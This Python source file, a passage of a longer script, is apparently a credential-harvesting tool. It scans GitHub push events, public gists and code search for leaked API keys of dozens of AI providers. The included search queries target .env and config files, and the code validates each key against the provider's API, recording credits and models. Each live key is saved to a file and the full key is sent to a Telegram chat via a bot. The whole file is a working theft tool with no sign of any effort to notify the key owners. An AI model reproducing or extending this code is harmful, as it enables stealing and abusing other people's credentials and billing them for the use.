    h={"Authorization":f"Bearer {key}","Content-Type":"application/json"}
    try:
        sc,_,raw=_request("GET","https://api.moonshot.ai/v1/models",headers=h)
        if sc==200:
            r["status"]="live"
            data=json.loads(raw)
            models=data.get("data",[])
            r["details"]["model_count"]=str(len(models))
            r["details"]["models"]=", ".join(m.get("id","") for m in models[:4])
        elif sc==401:
            r["status"]="dead"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

def _val_qwen(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"Authorization":f"Bearer {key}","Content-Type":"application/json"}
    try:
        sc,_,raw=_request("GET","https://dashscope.aliyuncs.com/compatible-mode/v1/models",headers=h)
        if sc==200:
            r["status"]="live"
            data=json.loads(raw)
            models=data.get("data",[])
            r["details"]["model_count"]=str(len(models))
            r["details"]["models"]=", ".join(m.get("id","") for m in models[:4])
        elif sc==401:
            r["status"]="dead"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate/quota limited — key valid"
        else:
            # Try international endpoint as fallback
            try:
                sc2,_,raw2=_request("GET","https://dashscope-intl.aliyuncs.com/compatible-mode/v1/models",headers=h)
                if sc2==200:
                    r["status"]="live"
                    data=json.loads(raw2)
                    models=data.get("data",[])
                    r["details"]["model_count"]=str(len(models))
                    r["details"]["note"]="via intl endpoint"
                elif sc2==401:
                    r["status"]="dead"
                else:
                    r["status"]="unknown"; r["details"]["http"]=str(sc)
            except: r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

def _val_runway(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"Authorization":f"Bearer {key}","X-Runway-Version":"2024-11-06"}
    try:
        sc,_,raw=_request("GET","https://api.dev.runwayml.com/v1/organization",headers=h)
        if sc==200:
            r["status"]="live"
            data=json.loads(raw)
            r["details"]["name"]    =data.get("name","")
            r["details"]["credits"] =str(data.get("creditBalance",""))
        elif sc==401:
            r["status"]="dead"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

def _val_kling(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"Authorization":f"Bearer {key}","Content-Type":"application/json"}
    try:
        sc,_,raw=_request("GET","https://api.klingai.com/v1/account/info",headers=h)
        if sc==200:
            r["status"]="live"
            data=json.loads(raw)
            r["details"]["note"]=str(data.get("message","Authenticated"))
        elif sc==401:
            r["status"]="dead"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

# ── Batch 4 validators ───────────────────────────────────────────────────────
def _val_leonardo(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"authorization":f"Bearer {key}","accept":"application/json"}
    try:
        sc,_,raw=_request("GET","https://cloud.leonardo.ai/api/rest/v1/me",headers=h)
        if sc==200:
            r["status"]="live"
            data=json.loads(raw)
            user=(data.get("user_details") or [{}])[0]
            r["details"]["username"]=user.get("user",{}).get("username","")
            r["details"]["tokens"]=str(user.get("tokenRenewalDate",""))
        elif sc==401:
            r["status"]="dead"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

def _val_luma(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"Authorization":f"luma-api-key={key}","accept":"application/json"}
    try:
        sc,_,raw=_request("GET","https://api.lumalabs.ai/dream-machine/v1/credits",headers=h)
        if sc==200:
            r["status"]="live"
            data=json.loads(raw)
            r["details"]["credits"]=str(data.get("credit_balance",""))
        elif sc==401:
            r["status"]="dead"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

def _val_ideogram(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"Api-Key":key,"Content-Type":"application/json"}
    try:
        sc,_,raw=_request("GET","https://api.ideogram.ai/manage/api/subscription",headers=h)
        if sc==200:
            r["status"]="live"
            data=json.loads(raw)
            r["details"]["tier"]           =str(data.get("tier",""))
            r["details"]["credits"]        =str(data.get("available_credits",""))
        elif sc==401:
            r["status"]="dead"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

def _val_pika(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"Authorization":f"Bearer {key}","Content-Type":"application/json"}
    try:
        sc,_,raw=_request("GET","https://api.pika.art/v2/account",headers=h)
        if sc==200:
            r["status"]="live"
            data=json.loads(raw)
            r["details"]["note"]=str(data.get("message","Authenticated"))
        elif sc==401:
            r["status"]="dead"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

def _val_deepai(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"api-key":key}
    try:
        sc,_,raw=_request("GET","https://api.deepai.org/api/get-models",headers=h)
        if sc==200:
            r["status"]="live"
        elif sc==401:
            r["status"]="dead"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r


# ── Batch 5 + 6 validators ───────────────────────────────────────────────────

def _val_coze(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"Authorization":f"Bearer {key}","Content-Type":"application/json"}
    try:
        sc,_,raw=_request("GET","https://api.coze.com/v1/bots/list?space_id=0&page_num=1&page_size=1",headers=h)
        if sc==200:
            r["status"]="live"
            try:
                data=json.loads(raw)
                r["details"]["note"]=str(data.get("msg","OK"))
            except: pass
        elif sc==401:
            r["status"]="dead"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

def _val_zhipu(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"Authorization":f"Bearer {key}","Content-Type":"application/json"}
    body=json.dumps({"model":"glm-4-flash","max_tokens":1,
                     "messages":[{"role":"user","content":"hi"}]}).encode()
    try:
        sc,_,raw=_request("POST","https://open.bigmodel.cn/api/paas/v4/chat/completions",headers=h,body=body)
        if sc==200:
            r["status"]="live"
            data=json.loads(raw)
            r["details"]["model"]=data.get("model","")
        elif sc==401:
            r["status"]="dead"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        elif sc==400:
            r["status"]="live"
            r["details"]["note"]="Auth OK (param error)"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

def _val_bfl(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"x-key":key,"Content-Type":"application/json"}
    body=json.dumps({"prompt":"a red circle","width":256,"height":256}).encode()
    try:
        sc,_,raw=_request("POST","https://api.bfl.ml/v1/flux-pro-1.1",headers=h,body=body)
        if sc==200:
            r["status"]="live"
            try:
                data=json.loads(raw)
                r["details"]["task_id"]=str(data.get("id",""))
            except: pass
        elif sc==401 or sc==403:
            r["status"]="dead"
        elif sc==402:
            r["status"]="ratelimited"
            r["details"]["note"]="No credits — key valid but insufficient balance"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        elif sc==422:
            r["status"]="live"
            r["details"]["note"]="Auth OK (param error)"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

def _val_jina(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"Authorization":f"Bearer {key}","Content-Type":"application/json"}
    body=json.dumps({"model":"jina-embeddings-v3","input":["hi"]}).encode()
    try:
        sc,_,raw=_request("POST","https://api.jina.ai/v1/embeddings",headers=h,body=body)
        if sc==200:
            r["status"]="live"
            try:
                data=json.loads(raw)
                r["details"]["model"]=data.get("model","")
            except: pass
        elif sc==401:
            r["status"]="dead"
        elif sc==402:
            r["status"]="ratelimited"
            r["details"]["note"]="No credits — key valid"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

def _val_deepgram(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"Authorization":f"Token {key}"}
    try:
        sc,_,raw=_request("GET","https://api.deepgram.com/v1/projects",headers=h)
        if sc==200:
            r["status"]="live"
            try:
                data=json.loads(raw)
                projects=data.get("projects",[])
                r["details"]["project_count"]=str(len(projects))
                if projects: r["details"]["project_name"]=projects[0].get("name","")
            except: pass
        elif sc==401:
            r["status"]="dead"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

def _val_assemblyai(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"Authorization":key}
    try:
        sc,_,raw=_request("GET","https://api.assemblyai.com/v2/transcript",headers=h)
        if sc in(200,400):
            r["status"]="live"
            r["details"]["note"]="Auth OK"
        elif sc==401:
            r["status"]="dead"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

def _val_sambanova(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"Authorization":f"Bearer {key}","Content-Type":"application/json"}
    try:
        sc,_,raw=_request("GET","https://api.sambanova.ai/v1/models",headers=h)
        if sc==200:
            r["status"]="live"
            data=json.loads(raw)
            models=data.get("data",[])
            r["details"]["model_count"]=str(len(models))
            r["details"]["models"]=", ".join(m.get("id","") for m in models[:3])
        elif sc==401:
            r["status"]="dead"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

def _val_hyperbolic(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"Authorization":f"Bearer {key}","Content-Type":"application/json"}
    try:
        sc,_,raw=_request("GET","https://api.hyperbolic.xyz/v1/models",headers=h)
        if sc==200:
            r["status"]="live"
            data=json.loads(raw)
            models=data.get("data",[])
            r["details"]["model_count"]=str(len(models))
            r["details"]["models"]=", ".join(m.get("id","") for m in models[:3])
        elif sc==401:
            r["status"]="dead"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

def _val_lepton(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"Authorization":f"Bearer {key}"}
    try:
        sc,_,raw=_request("GET","https://api.lepton.ai/api/v1/deployments",headers=h)
        if sc==200:
            r["status"]="live"
        elif sc==401:
            r["status"]="dead"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

def _val_cartesia(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"X-API-Key":key}
    try:
        sc,_,raw=_request("GET","https://api.cartesia.ai/voices",headers=h)
        if sc==200:
            r["status"]="live"
            try:
                data=json.loads(raw)
                voices=data if isinstance(data,list) else data.get("voices",[])
                r["details"]["voice_count"]=str(len(voices))
            except: pass
        elif sc==401 or sc==403:
            r["status"]="dead"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

def _val_pinecone(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"Api-Key":key}
    try:
        sc,_,raw=_request("GET","https://api.pinecone.io/indexes",headers=h)
        if sc==200:
            r["status"]="live"
            try:
                data=json.loads(raw)
                idxs=data.get("indexes",[])
                r["details"]["index_count"]=str(len(idxs))
            except: pass
        elif sc==401 or sc==403:
            r["status"]="dead"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

def _val_getimg(entry):
    key=entry["key"]
    r={"status":"dead","details":{}}
    h={"Authorization":f"Bearer {key}"}
    try:
        sc,_,raw=_request("GET","https://api.getimg.ai/v1/models",headers=h)
        if sc==200:
            r["status"]="live"
            try:
                data=json.loads(raw)
                r["details"]["model_count"]=str(len(data) if isinstance(data,list) else "")
            except: pass
        elif sc==401 or sc==403:
            r["status"]="dead"
        elif sc==402:
            r["status"]="ratelimited"
            r["details"]["note"]="No credits — key valid"
        elif sc==429:
            r["status"]="ratelimited"
            r["details"]["note"]="Rate limited — key valid"
        else:
            r["status"]="unknown"; r["details"]["http"]=str(sc)
    except Exception as e:
        r["status"]="error"; r["details"]["error"]=str(e)
    return r

_VAL_MAP={
    "openai":       _val_openai,
    "anthropic":    _val_anthropic,
    "deepseek":     _val_deepseek,
    "groq":         _val_groq,
    "xai":          _val_xai,
    "perplexity":   _val_perplexity,
    "mistral":      _val_mistral,
    "cohere":       _val_cohere,
    "together":     _val_together,
    "gemini":       _val_gemini,
    "huggingface":  _val_huggingface,
    "replicate":    _val_replicate,
    "elevenlabs":   _val_elevenlabs,
    # ── Batch 1 ──
    "cerebras":     _val_cerebras,
    "openrouter":   _val_openrouter,
    "fireworks":    _val_fireworks,
    "novita":       _val_novita,
    "ai21":         _val_ai21,
    "azure_openai": _val_azure_openai,
    # ── Batch 2 ──
    "fal":          _val_fal,
    "stability":    _val_stability,
    "bedrock":      _val_bedrock,
    "cloudflare":   _val_cloudflare,
    "nvidia":       _val_nvidia,
    "voyage":       _val_voyage,
    "minimax":      _val_minimax,
    "moonshot":     _val_moonshot,
    "qwen":         _val_qwen,
    "runway":       _val_runway,
    "kling":        _val_kling,
    "leonardo":     _val_leonardo,
    "luma":         _val_luma,
    "ideogram":     _val_ideogram,
    "pika":         _val_pika,
    "deepai":       _val_deepai,
    # ── Batch 5 ──
    "coze":         _val_coze,
    "zhipu":        _val_zhipu,
    "bfl":          _val_bfl,
    "jina":         _val_jina,
    "deepgram":     _val_deepgram,
    "assemblyai":   _val_assemblyai,
    # ── Batch 6 ──
    "sambanova":    _val_sambanova,
    "hyperbolic":   _val_hyperbolic,
    "lepton":       _val_lepton,
    "cartesia":     _val_cartesia,
    "pinecone":     _val_pinecone,
    "getimg":       _val_getimg,
}

def _validate(entry):
    p=entry["platform"]
    log.info(col(f"  Validating [{p.upper()}] {entry['key'][:55]}...","cyan"))
    fn=_VAL_MAP.get(p)
    if fn:
        res=fn(entry)
    else:
        res={"status":"unknown","details":{"note":"No validator"}}
    entry.update(res)
    entry["validated_at"]=datetime.now(timezone.utc).isoformat()
    return entry

def _he(s): return str(s).replace("&","&amp;").replace("<","&lt;").replace(">","&gt;")

def _telegram(entry, label="LIVE"):
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID: return
    plat=entry.get("platform",""); key=entry.get("key","")
    fname=entry.get("filename",""); src=entry.get("source_url","")
    dets=entry.get("details",{})
    ts=datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")

    # Build details block
    dl=[f"  <code>{_he(k):<22}</code>: {_he(v)}" for k,v in dets.items() if v]
    db="\n".join(dl) if dl else "  (none)"

    # Disable link preview by wrapping URLs in zero-width spaces
    def _nopreview(u):
        return u.replace("https://","https://\u200b") if u else ""

    if label=="LIVE":
        header=(
            f"🔑 <b>#LIVE</b> <b>#AI_KEY</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━"
        )
    else:
        header=(
            f"⚠️ <b>#RATE_LIMITED</b> <b>#AI_KEY</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━"
        )

    msg=(
        f"{header}\n\n"
        f"🏷 <b>Platform :</b> <b>#{_he(plat.upper())}</b>\n"
        f"🔐 <b>Key      :</b>\n<code>{_he(key)}</code>\n\n"
        f"📁 <b>File     :</b> <code>{_he(fname)}</code>\n"
        f"🔗 <b>Source   :</b> <code>{_he(_nopreview(src))}</code>\n"
        f"🕐 <b>Time     :</b> <code>{ts}</code>\n\n"
        f"📋 <b>Details  :</b>\n{db}"
    )

    payload={
        "chat_id":TELEGRAM_CHAT_ID,
        "text":msg,
        "parse_mode":"HTML",
        "disable_web_page_preview":True,
        "disable_notification":False,
    }
    body=json.dumps(payload).encode()
    try:
        _request("POST",f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage",
                 headers={"Content-Type":"application/json"},body=body,retries=2)
        log.info(col(f"  Telegram alert sent [{label}].","green"))
    except Exception as e:
        log.warning(f"Telegram failed: {e}")

def _save(entry):
    st  =entry.get("status","unknown")
    plat=entry.get("platform","")
    key =entry.get("key","")
    src =entry.get("source_url","")
    ts  =entry.get("validated_at",datetime.now(timezone.utc).isoformat())
    line=f"[{ts}] [{st.upper():12}] [{plat:12}] {key} | {src}"
    _append_file(REPORT_FILE,line)

    if st=="live":
        _append_file(LIVE_KEYS_FILE,line)
        log.info(col(f"  ✅ LIVE         [{plat.upper()}] {key[:65]}","green","bold"))
        _telegram(entry,"LIVE")

    elif st=="ratelimited":
        _append_file("ai_ratelimited_keys.txt",line)
        log.info(col(f"  ⚠️  RATE-LIMITED [{plat.upper()}] {key[:55]}  — {entry.get('details',{}).get('note','')}","yellow","bold"))
        # Rate-limited keys are NOT sent to Telegram — only live keys are reported

    else:
        log.info(col(f"  ✗ {st.upper()} [{plat}] {key[:50]}","dim"))

    with _results_lock:
        _results.append(entry)
    _flush_results()

def _process(content,filename,source_url):
    if not content or not content.strip():
        log.debug(col(f"    [EMPTY-CONTENT] {filename}","dim"))
        return
    entries=_extract(content,filename)
    if not entries:
        log.debug(col(f"    [NO-KEYS] {filename}","dim"))
        return
    log.info(col(f"  [HIT] {len(entries)} candidate(s) in {filename}","yellow","bold"))
    for e in entries:
        if not _is_new(e):
            log.debug(col(f"    [DUP] {e['key'][:40]}","dim"))
            continue
        log.info(col(f"  [NEW] [{e['platform'].upper()}] {e['key'][:55]}","magenta","bold"))
        e["source_url"]=source_url
        v=_validate(e)
        _save(v)

_INTERESTING_EXTS=re.compile(
    r'\.(env|cfg|conf|config|ini|yaml|yml|toml|json|js|ts|jsx|tsx|php|py|rb|java|'
    r'cs|go|kt|swift|sh|bash|zsh|properties|txt|xml|gradle|plist)$',
    re.IGNORECASE,
)
_INTERESTING_NAMES=re.compile(
    r'(config|setting|secret|credential|key|openai|anthropic|claude|deepseek|groq|'
    r'mistral|cohere|gemini|xai|grok|perplexity|together|huggingface|replicate|elevenlabs|'
    r'cerebras|openrouter|fireworks|novita|ai21|azure|fal|stability|bedrock|cloudflare|'
    r'nvidia|voyage|minimax|moonshot|kimi|qwen|dashscope|runway|kling|'
    r'leonardo|luma|ideogram|pika|deepai|llm|ai_key|env|dotenv|deploy|prod|production)',
    re.IGNORECASE,
)

def _should_fetch_file(fname,fpath):
    if _skip_fname(fname) or _skip_fname(fpath): return False
    if _INTERESTING_EXTS.search(fname): return True
    if _INTERESTING_NAMES.search(fname): return True
    return False

def _html_url_to_raw(html_url):
    raw=html_url.replace("https://github.com/","https://raw.githubusercontent.com/")
    raw=re.sub(r'/blob/','/',raw,count=1)
    return raw

_last_push_id=""
_push_lock=threading.Lock()

def _scan_push_events():
    global _last_push_id
    log.info(col("━━━ Phase 0: Push Events ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━","blue","bold"))
    total=0
    for page in range(1,PUSH_PAGES+1):
        status,_,data=_github_get("/events",{"per_page":"100","page":str(page)})
        if not isinstance(data,list):
            log.warning(col(f"  Push events page {page}: no data (status={status})","yellow"))
            break
        new_events=[]
        with _push_lock:
            last=_last_push_id
            for ev in data:
                if ev.get("id")==last: break
                if ev.get("type")=="PushEvent": new_events.append(ev)
            if page==1 and data:
                _last_push_id=data[0].get("id",last)
        if not new_events:
            log.debug(col(f"  Page {page}: no new push events.","dim"))
            break
        total+=len(new_events)
        log.info(col(f"  Page {page}: {len(new_events)} new PushEvents","blue"))

        def _handle_event(ev):
            repo=(ev.get("repo") or {}).get("name","")
            commits=(ev.get("payload") or {}).get("commits",[])
            for commit in commits:
                sha=commit.get("sha","")
                if not sha: continue
                tok=_rotator.get()
                h={"Accept":"application/vnd.github+json","X-GitHub-Api-Version":"2022-11-28"}
                if tok: h["Authorization"]=f"Bearer {tok}"
                try:
                    sc,_,raw=_request("GET",f"https://api.github.com/repos/{repo}/commits/{sha}",headers=h)
                    if sc!=200: continue
                    cd=json.loads(raw)
                    for fi in cd.get("files",[]):
                        fn =fi.get("filename","")
                        ru =fi.get("raw_url","")
                        patch=fi.get("patch","") or ""
                        if not _should_fetch_file(fn,fn):
                            log.debug(col(f"      [SKIP] {fn}","dim"))
                            continue
                        log.debug(col(f"      [FETCH] {fn}","dim"))
                        content=_fetch_raw(ru,tok) if ru else patch
                        if content:
                            _process(content,fn,ru or f"https://github.com/{repo}/commit/{sha}")
                except Exception as exc:
                    log.debug(f"    Commit fetch error {sha}: {exc}")

        with ThreadPoolExecutor(max_workers=_workers()) as p:
            list(p.map(_handle_event,new_events))
    log.info(col(f"  Push Events done: {total} events processed.","blue"))

_last_gist_ts=""
_gist_lock=threading.Lock()

def _scan_gists():
    global _last_gist_ts
    log.info(col("━━━ Phase 1: Public Gists ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━","blue","bold"))
    total=0
    for page in range(1,GIST_PAGES+1):
        params={"per_page":"100","page":str(page)}
        with _gist_lock:
            if _last_gist_ts: params["since"]=_last_gist_ts
        status,_,gists=_github_get("/gists/public",params)
        if not isinstance(gists,list) or not gists:
            log.warning(col(f"  Gist page {page}: no data (status={status})","yellow"))
            break
        with _gist_lock:
            if page==1: _last_gist_ts=gists[0].get("updated_at",_last_gist_ts)
        total+=len(gists)
        log.info(col(f"  Page {page}: {len(gists)} gists","blue"))

        def _handle_gist(gist):
            for fname,fi in gist.get("files",{}).items():
                if _skip_fname(fname):
                    log.debug(col(f"      [SKIP] {fname}","dim"))
                    continue
                raw_url=fi.get("raw_url","")
                if raw_url:
                    log.debug(col(f"      [FETCH] {fname}","dim"))
                    content=_fetch_raw(raw_url)
                    if content: _process(content,fname,raw_url)

        with ThreadPoolExecutor(max_workers=_workers()) as p:
            list(p.map(_handle_gist,gists))
    log.info(col(f"  Gists done: {total} gists scanned.","blue"))

_SEARCH_QUERIES=[
    # ── OpenAI ──
    '"sk-proj-" openai language:javascript',
    '"sk-proj-" openai language:python',
    '"sk-proj-" openai language:typescript',
    '"sk-proj-" openai language:php',
    '"sk-proj-" openai language:go',
    '"sk-proj-" openai language:java',
    '"sk-proj-" openai language:ruby',
    '"sk-proj-" filename:.env',
    'OPENAI_API_KEY "sk-proj-" filename:.env',
    'OPENAI_API_KEY "sk-proj-" language:python',
    'OPENAI_API_KEY "sk-proj-" language:javascript',
    '"sk-svcacct-" openai',
    '"sk-" OPENAI_API_KEY filename:.env',
    # ── Anthropic ──
    '"sk-ant-api" anthropic language:python',
    '"sk-ant-api" anthropic language:javascript',
    '"sk-ant-api" anthropic language:typescript',
    '"sk-ant-" ANTHROPIC_API_KEY filename:.env',
    'ANTHROPIC_API_KEY "sk-ant-" language:python',
    'ANTHROPIC_API_KEY "sk-ant-" language:javascript',
    '"sk-ant-" filename:.env',
    '"sk-ant-" filename:config',
    # ── DeepSeek ──
    'DEEPSEEK_API_KEY filename:.env language:python',
    'DEEPSEEK_API_KEY filename:.env language:javascript',
    '"DEEPSEEK_API_KEY" "sk-" filename:.env',
    '"deepseek" "api_key" filename:.env',
    # ── Groq ──
    '"gsk_" groq language:python',
    '"gsk_" groq language:javascript',
    '"gsk_" groq language:typescript',
    'GROQ_API_KEY "gsk_" filename:.env',
    '"gsk_" filename:.env',
    # ── xAI ──
    '"xai-" grok language:python',
    '"xai-" grok language:javascript',
    'XAI_API_KEY "xai-" filename:.env',
    '"xai-" filename:.env',
    # ── Perplexity ──
    '"pplx-" perplexity language:python',
    '"pplx-" perplexity language:javascript',
    'PERPLEXITY_API_KEY "pplx-" filename:.env',
    '"pplx-" filename:.env',
    # ── Mistral ──
    'MISTRAL_API_KEY filename:.env language:python',
    'MISTRAL_API_KEY filename:.env language:javascript',
    '"MISTRAL_API_KEY" filename:.env',
    # ── Cohere ──
    'COHERE_API_KEY filename:.env language:python',
    'COHERE_API_KEY filename:.env language:javascript',
    '"COHERE_API_KEY" filename:.env',
    # ── Together ──
    'TOGETHER_API_KEY filename:.env language:python',
    'TOGETHER_API_KEY filename:.env language:javascript',
    '"TOGETHER_API_KEY" filename:.env',
    # ── Gemini ──
    '"AIza" GEMINI_API_KEY language:python',
    '"AIza" GEMINI_API_KEY language:javascript',
    'GEMINI_API_KEY "AIza" filename:.env',
    'GOOGLE_API_KEY "AIza" filename:.env',
    '"AIza" filename:.env',
    # ── HuggingFace ──
    '"hf_" HUGGINGFACE_TOKEN language:python',
    '"hf_" HF_TOKEN filename:.env',
    'HUGGINGFACE_API_KEY "hf_" filename:.env',
    # ── Replicate ──
    '"r8_" replicate language:python',
    '"r8_" replicate language:javascript',
    'REPLICATE_API_TOKEN "r8_" filename:.env',
    # ── ElevenLabs ──
    '"ELEVENLABS_API_KEY" filename:.env',
    '"ELEVEN_API_KEY" filename:.env',
    # ── Cerebras ──
    'CEREBRAS_API_KEY filename:.env',
    '"csk-" cerebras language:python',
    '"csk-" cerebras language:javascript',
    # ── OpenRouter ──
    'OPENROUTER_API_KEY filename:.env',
    '"sk-or-v1-" openrouter language:python',
    '"sk-or-v1-" openrouter language:javascript',
    '"sk-or-v1-" filename:.env',
    # ── Fireworks AI ──
    'FIREWORKS_API_KEY filename:.env',
    '"fw_" fireworks language:python',
    '"fw_" fireworks language:javascript',
    # ── Novita AI ──
    'NOVITA_API_KEY filename:.env',
    '"novita" "api_key" filename:.env',
    # ── AI21 Labs ──
    'AI21_API_KEY filename:.env',
    '"AI21_API_KEY" language:python',
    # ── Azure OpenAI ──
    'AZURE_OPENAI_API_KEY filename:.env',
    '"AZURE_OPENAI_API_KEY" language:python',
    '"AZURE_OPENAI_API_KEY" language:javascript',
    # ── Fal AI ──
    'FAL_KEY filename:.env',
    '"FAL_API_KEY" filename:.env',
    'FAL_KEY language:python',
    # ── Stability AI ──
    'STABILITY_API_KEY filename:.env',
    'STABILITYAI_API_KEY filename:.env',
    '"STABILITY_API_KEY" language:python',
    # ── AWS Bedrock ──
    'BEDROCK_API_KEY filename:.env',
    'AWS_BEDROCK_API_KEY filename:.env',
    '"ABSK" bedrock filename:.env',
    # ── Cloudflare Workers AI ──
    'CLOUDFLARE_API_TOKEN filename:.env',
    'CF_API_TOKEN filename:.env',
    '"workers-ai" CLOUDFLARE_API_TOKEN language:python',
    # ── NVIDIA NIM ──
    'NVIDIA_API_KEY filename:.env',
    '"nvapi-" nvidia language:python',
    '"nvapi-" filename:.env',
    # ── Voyage AI ──
    'VOYAGE_API_KEY filename:.env',
    '"pa-" voyage language:python',
    # ── MiniMax ──
    'MINIMAX_API_KEY filename:.env',
    '"MINIMAX_API_KEY" language:python',
    '"MINIMAX_API_KEY" language:javascript',
    # ── Moonshot / Kimi ──
    'MOONSHOT_API_KEY filename:.env',
    '"MOONSHOT_API_KEY" language:python',
    '"kimi" "api_key" filename:.env',
    # ── Qwen / DashScope ──
    'DASHSCOPE_API_KEY filename:.env',
    'QWEN_API_KEY filename:.env',
    '"DASHSCOPE_API_KEY" language:python',
    # ── Runway ML ──
    'RUNWAYML_API_SECRET filename:.env',
    '"RUNWAYML_API_SECRET" language:python',
    '"key_" runwayml filename:.env',
    # ── Kling AI ──
    'KLING_API_KEY filename:.env',
    '"KLING_AI_API_KEY" filename:.env',
    '"kling" "api_key" filename:.env',
    # ── Leonardo AI ──
    'LEONARDO_API_KEY filename:.env',
    '"LEONARDO_AI_API_KEY" filename:.env',
    '"leonardo" "api_key" language:python',
    # ── Luma AI ──
    'LUMAAI_API_KEY filename:.env',
    'LUMA_API_KEY filename:.env',
    '"lumalabs" "api_key" filename:.env',
    # ── Ideogram ──
    'IDEOGRAM_API_KEY filename:.env',
    '"IDEOGRAM_API_KEY" language:python',
    # ── Pika Labs ──
